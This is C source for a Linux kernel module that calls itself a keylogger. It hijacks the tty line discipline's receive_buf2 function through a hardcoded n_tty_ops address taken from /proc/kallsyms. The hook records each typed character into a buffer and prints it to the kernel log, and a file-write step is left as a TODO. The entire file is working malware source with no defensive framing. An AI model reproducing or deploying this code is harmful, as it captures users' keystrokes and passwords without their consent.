// Keylogger - tested for linux kernel version 5.4.31

// Get addr of n_tty_ops from /proc/kallsyms
#define N_TTY_OPS_ADDR 0xffffffff87f70100
#define BACKSPACE_KEY 127
#define ENTER_KEY 13
#define BUF_SIZE 100000

// Write_increment is in seconds
#define WRITE_INCREMENT (1 * 30)

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kref.h>
#include <linux/fs.h>
#include <linux/time.h>
#include <linux/tty.h>
#include <linux/tty_ldisc.h>

// Store pointer to tty_ldisc_ops
static struct tty_ldisc_ops *our_n_tty_ops;
// Point to original receive_buf2
static int (*original_receive_buf2) (struct tty_struct*, const unsigned char*, char*, int);
// Store current_time (rather than reallocating everytime)
static struct timespec *our_current_time;
// For storing buffer
struct line_buf {
	char line[BUF_SIZE];
	int pos;
	time_t last_write;
};
static struct line_buf key_buf;

static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	// TODO Verify if write_cnt is correct for all cases. Can it sometimes be different?
	// Check if there is nothing to log 
	if (count == 1 && tty->write_cnt == 2047) {
		// Get current time information
		getnstimeofday(our_current_time);

		// TODO Handle other special case keys
		// Log data in key buffer
		if (*cp == BACKSPACE_KEY) {
			key_buf.pos--;

			// Only backspace until last command
			if (key_buf.line[key_buf.pos] != '\n') {
				key_buf.line[key_buf.pos] = 0;
			} else {
				key_buf.pos++;
			}
		} else if (*cp == ENTER_KEY) {
			key_buf.line[key_buf.pos] = '\n';
			key_buf.pos++;
		} else {
			key_buf.line[key_buf.pos] = *cp;
			key_buf.pos++;
		}
		key_buf.line[key_buf.pos] = '\0';

		printk(KERN_INFO "K: %s\n", key_buf.line);


		// If time increment has passed or line_buf is full, write to file
		if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT || key_buf.pos >= BUF_SIZE - 1) {
			// Write to fie
			// TODO Adapt to procfs or find use kernel_write, kernel_read
		}
	}

}

static int new_receive_buf2(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	log_keys(tty, cp, fp, count);
	return original_receive_buf2(tty, cp, fp, count);
}

static void hijack_tty_ldisc_receive_buf(void)
{
	// Note 1:
	// tty_ldisc_N_TTY is deprecated and replaced by n_tty_ops
	// Source: https://lore.kernel.org/patchwork/patch/634134/
	// n_tty_ops is the struct containing receive_buf fn
	// Ttype of n_tty_ops is struct tty_ldisc_ops
	// Address of n_tty_ops is available via /proc/kallsyms

	// Note 2:
	// Receive_buf2 is preferred over receive_buf

	our_n_tty_ops = (struct tty_ldisc_ops *) N_TTY_OPS_ADDR;
	original_receive_buf2 = our_n_tty_ops->receive_buf2;
	our_n_tty_ops->receive_buf2 = new_receive_buf2;
}

static void unhijack_tty_ldisc_receive_buf(void)
{
	our_n_tty_ops->receive_buf2 = original_receive_buf2;
}

int init_module(void)
{
	printk(KERN_INFO "Loading keylogger\n");

	// Initialize timer
	our_current_time = vmalloc(sizeof(struct timespec));

	hijack_tty_ldisc_receive_buf();
	printk(KERN_INFO "Finished loading keylogger\n");
	return 0;
}
	
void cleanup_module(void)
{
	printk(KERN_INFO "Unloading keylogger\n");
	unhijack_tty_ldisc_receive_buf();
	printk(KERN_INFO "Finished unloading keylogger\n");
}
